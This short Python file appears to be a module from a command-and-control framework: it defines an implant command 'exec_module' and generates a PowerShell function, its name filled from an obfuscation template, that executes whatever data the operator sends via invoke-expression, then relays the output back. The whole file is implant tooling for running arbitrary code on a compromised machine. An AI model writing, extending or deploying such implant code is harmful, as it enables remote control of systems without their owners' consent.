class InvokeExpression:
    # Module notes:
    #   IM should be renames to IE, after initial testing.
    type = "IM"
    args = "Module name"
    input = "exec_module"

    def process_implant_response(self, data, args):
        return f"Exec'ing module: {args}\n{data.decode()}", None

    def implant_text(self):
        var = '''
function {{ ron.obf_invoke_module }} ($data) {
    $global:tr = invoke-expression "$data"
}'''
        return var
